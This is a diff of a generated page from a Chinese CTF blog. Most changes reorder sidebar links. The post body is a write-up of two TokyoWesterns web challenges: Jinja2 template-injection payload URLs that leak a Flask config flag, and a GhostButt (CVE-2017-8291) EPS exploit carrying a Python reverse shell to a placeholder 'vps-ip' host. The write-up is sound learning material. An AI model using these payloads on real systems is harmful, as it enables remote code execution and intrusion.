@@ -407,13 +407,13 @@ height:50vh;
 <h4 id="Shrine"><a href="#Shrine" class="headerlink" title="Shrine"></a>Shrine</h4><p>这题进去就给了源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
 <p>可以看到用了jinja和有一堆黑名单，猜测是jinja2的ssti注入  </p>
 <h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>1、/shrine/&lt;path: shrine&gt;是注入点<br>2、过滤了括号和config以及self<br>3、漏洞是jinja2的ssti漏洞  </p>
-<h5 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h5><p>试下能不能执行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;3*3&#125;&#125;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;9</span></span><br></pre></td></tr></table></figure></p>
-<p>确实可以进行ssti，但是我们要想办法绕开waf<br>如果完全没有waf，我们可以<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> config</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> self</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> ()</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<h5 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h5><p>试下能不能执行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;3*3&#125;&#125;</span><br><span class="line"><span class="meta">&gt;</span>&gt;&gt;&gt;9</span><br></pre></td></tr></table></figure></p>
+<p>确实可以进行ssti，但是我们要想办法绕开waf<br>如果完全没有waf，我们可以<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> config</span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;</span><br><span class="line"><span class="meta">#</span> self</span><br><span class="line"><span class="meta">#</span> &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;</span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line"><span class="meta">#</span> ()</span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>但是现在有waf，所以我们不能直接利用，这里大佬给了两个利用点<br><strong>url_for</strong><br>在url_for里面，我们可以找到current_app<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__&#125;&#125;</span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <p><strong>get_flashed_messages</strong><br>这个里面也能找到current_app<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>这样就能拿到flag了TWCTF{pray_f0r_sacred_jinja2}  </p>
 <h4 id="slack-emoji-converter"><a href="#slack-emoji-converter" class="headerlink" title="slack emoji converter"></a>slack emoji converter</h4><p>依旧是能拿到源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    make_response,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/conv', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">()</span>:</span></span><br><span class="line">    f = request.files.get(<span class="string">'image'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    ext = f.filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]</span><br><span class="line">    fname = tempfile.mktemp(<span class="string">"emoji"</span>)</span><br><span class="line">    fname = <span class="string">"&#123;&#125;.&#123;&#125;"</span>.format(fname, ext)</span><br><span class="line">    f.save(fname)</span><br><span class="line">    img = Image.open(fname)</span><br><span class="line">    w, h = img.size</span><br><span class="line">    r = <span class="number">128</span>/max(w, h)</span><br><span class="line">    newimg = img.resize((int(w*r), int(h*r)))</span><br><span class="line">    newimg.save(fname)</span><br><span class="line">    response = make_response()</span><br><span class="line">    response.data = open(fname, <span class="string">"rb"</span>).read()</span><br><span class="line">    response.headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=emoji_&#123;&#125;'</span>.format(f.filename)</span><br><span class="line">    os.unlink(fname)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">8080</span>, debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
-<p>这题考了GhostButt任意命令执行（cve-2017-8291），通过bypass dSAFER参数达到目的，exp如下<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">!PS-Adobe-3.0 EPSF-3.0</span><br><span class="line"><span class="meta">%</span><span class="bash">%BoundingBox: 0 0 30 30</span></span><br><span class="line"></span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps-ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
+<p>这题考了GhostButt任意命令执行（cve-2017-8291），通过bypass dSAFER参数达到目的，exp如下<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">!PS-Adobe-3.0 EPSF-3.0</span><br><span class="line"><span class="meta">%</span>%BoundingBox: 0 0 30 30</span><br><span class="line"></span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps-ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
 <p>然后就能getshell了<br>具体分析请参考： <a href="https://paper.seebug.org/310/" target="_blank" rel="noopener">https://paper.seebug.org/310/</a><br><a href="https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2017-8291" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2017-8291</a>  </p>
 
     </article>
@@ -440,8 +440,8 @@ height:50vh;
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/02/24/2019tamuctf/" title="2019tamuctf">
-                    <div class="prevTitle">2019tamuctf</div>
+                <a href="/2019/02/24/2018百越杯wp/" title="2018百越杯wp">
+                    <div class="prevTitle">2018百越杯wp</div>
                 </a>
             
         </li>
@@ -1216,20 +1216,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 46
@@ -1273,22 +1259,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/2019西湖论剑web-writeup/">2019西湖论剑web writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-thejs/">code breaking thejs</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-thejs/">code breaking thejs</a>
         </li>
     
     
@@ -1323,12 +1309,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/2019安恒杯二月赛/">2019安恒杯二月赛</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/">imap_open()实现远程任意代码执行（CVE-2018-19518）</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/">imap_open()实现远程任意代码执行（CVE-2018-19518）</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/2019安恒杯二月赛/">2019安恒杯二月赛</a>
         </li>
     
     
@@ -1343,12 +1329,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
         </li>
     
     
@@ -1437,12 +1423,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
         </li>
     
     
@@ -1500,19 +1486,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php_tricks"><span class="iconfont-archer">&#xe606;</span>php_tricks</span>
     
-        <span class="sidebar-tag-name" data-tags="javascript"><span class="iconfont-archer">&#xe606;</span>javascript</span>
-    
         <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
+    
+        <span class="sidebar-tag-name" data-tags="javascript"><span class="iconfont-archer">&#xe606;</span>javascript</span>
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
+        <span class="sidebar-tag-name" data-tags="web+re"><span class="iconfont-archer">&#xe606;</span>web+re</span>
+    
         <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
-    
-        <span class="sidebar-tag-name" data-tags="web+re"><span class="iconfont-archer">&#xe606;</span>web+re</span>
     
         <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
     
